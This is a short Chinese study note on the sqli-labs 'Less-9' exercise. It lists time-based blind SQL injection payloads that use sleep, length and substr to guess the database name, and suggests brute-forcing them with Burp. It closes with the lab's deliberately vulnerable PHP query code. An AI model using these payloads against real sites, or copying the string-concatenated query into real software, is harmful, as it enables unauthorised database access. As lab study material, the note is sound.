# Less-9

## 0x00 注入

加单引号，双引号，括号，都显示一个内容。错误回显和正常回显内容一致。

时间盲注。

?id=1 and sleep(5) 无延时

?id=1' and sleep(10) and '1'='1 有延时

?id=1' and sleep(10) and '1'='2 无延时

确定是字符型的时间盲注

猜数据库名称

?id=1'  and length(database())=8 and sleep(5)--+ 有延时

?id=1'  and if(length(database())=8, sleep(5), 1)--+

?id=1' and if(substr(database(), 1, 1)='s', sleep(5), 1)--+

可以用bp爆破，有延时的response的length会比其他的不同。

很奇怪，5秒的延时，bp接受到状态码200的速度却非常快。似乎5秒的延时对bp没有影响。

## 0x01 分析

时间盲注和布尔盲注类似。



```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else
        {

        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        //print_r(mysql_error());
        //echo "You have an error in your SQL syntax";
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
```
